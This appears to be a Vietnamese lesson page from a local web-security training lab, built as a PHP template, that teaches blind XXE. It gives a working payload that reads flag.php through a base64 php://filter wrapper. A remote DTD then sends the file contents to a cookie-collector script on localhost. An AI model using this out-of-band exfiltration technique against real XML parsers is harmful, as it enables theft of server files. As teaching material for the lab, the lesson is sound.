<main class="main" role="main">
    <div class="content">
        <article id="post-xxe/blind_xxe" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    Blind XXE
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
                    <?php if($src_youtube != ''){echo '<button id="introduce-btn"><img src="public/images/play-circle.png" class="img-circle img-rotate" style="height: 24px; width: 24px; margin-right: 5px" " />Hướng Dẫn</button>';} ?>
                </div>
            </div>
            <?php echo get_iframe_youtube($src_youtube); ?>
            <div class="article-entry marked-body" itemprop="articleBody">
                <p>Ở các bài trước, ta đã nghiên cứu qua về Blind SQLi. Và lý do vì sao cần 1 cuộc tấn công Blind SQLi thay vì SQLi thông thường.</p>
                <p>Nay,ta cũng áp dụng những lý do đấy vào bài này. </p>
                <h1 id="Tai-sao-can-Blind-XXE"><a href="#Tai-sao-can-Blind-XXE" class="headerlink" title="Tại sao cần Blind XXE?"></a>Tại sao cần Blind XXE?</h1>
                <p>Như bài thực hành trước, ta có thực hiện XXE thường, và kết quả nhận được là source của file flag.php.<br>Nhưng các bạn nhớ kĩ, bởi vì có dòng code:</p>
                <blockquote>
                    <p>print_r($string);</p>
                </blockquote>
                <p>Tức là có kênh đầu ra cho nội dung của chúng ta. Ta thay đổi nội dung của trường <strong>account</strong> trong xml bằng nội dung file flag.php. Nhưng nếu không có code để in ra màn hình nội dung <strong>account</strong> thì ta cũng bó tay.<br>Do đó, ta cần phải sử dụng <strong>Blind XXE</strong> trong trường hợp không có kênh đầu ra phù hợp để lấy kết quả.</p>
                <h1 id="Y-tuong"><a href="#Y-tuong" class="headerlink" title="Ý tưởng"></a>Ý tưởng</h1>
                <p>Dễ thôi, pha thêm chút kỹ thuật XSS vào nữa. :)<br>Đầu tiên,ta vẫn sẽ khai báo 1 ENTITY để lấy <strong>nội dung file</strong>.</p>
                <p>Sau khi ta đã lấy được nội dung file rồi, ta có thể decode sang base64 (Dùng base64 wrapper ấy). Để gửi đi cho tiện mà không mất dữ liệu.</p>
                <p>Sau đó ta dùng cơ chế mà đã dùng trong XXE Global Connect Scan ấy, để mà tạo request ra ngoài kèm theo nội dung file.</p>
                <p>Còn kỹ thuật của XSS ấy hả, là cái <strong>getcookie.php</strong> ấy. Thay vì nhận cookie,thì bây giờ,ta nhận nội dung file:</p>
                <blockquote>
                    <p>
                        <a href="http://localhost/getcookie.php?file=">http://localhost/getcookie.php?file=</a>
                        <base64 của="" file="" lấy="" được=""></base64>
                    </p>
                </blockquote>
                <h1 id="Thuc-hien"><a href="#Thuc-hien" class="headerlink" title="Thực hiện"></a>Thực hiện</h1>
                <p>Nhắc lại chút, mình đã xây dựng sẵn file getcookie.php cho các bạn nằm ở thư mục:</p>
                <blockquote>
                    <p>test_case/xss/getcookie.php</p>
                </blockquote>
                <p>URL: <a href="http://localhost/test_case/xss/getcookie.php?cookie=">http://localhost/test_case/xss/getcookie.php?cookie=</a></p>
                <h2 id="Payload-gui"><a href="#Payload-gui" class="headerlink" title="Payload gửi."></a>Payload gửi.</h2>
                <figure class="highlight xml">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="meta">&lt;!DOCTYPE root [ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=vul/xxe/flag/flag.php"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://localhost/test_case/xxe/xxe.dtd"&gt;</span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%int;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p>Tuỳ vào đường dẫn mà sửa lại đến file xxe.dtd của bạn nhé.</p>
                <p><strong>File xxe.dtd có nội dung như sau</strong>:<br></p>
                <figure class="highlight">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line">&lt;!ENTITY % int "&lt;!ENTITY send SYSTEM 'http://localhost/test_case/xss/get_cookie.php?cookie=%file;'&gt;"&gt;</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <h2 id="Thu-payload"><a href="#Thu-payload" class="headerlink" title="Thử payload."></a>Thử payload.</h2>
                <p>Encode base64 rồi test thử nhé.</p>
                <h2 id="Thanh-cong"><a href="#Thanh-cong" class="headerlink" title="Thành công!"></a>Thành công! Nội dung nằm ở /test_case/xss/cookie.txt</h2>
            </div>
        </article>
        <?php
        if(isset($_GET['change_status'])){
            if($_GET['change_status'] == 1){
                change_status($id_post);
            }
        }
        echo print_footer_status($id_post,$title);
        ?>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>
</main>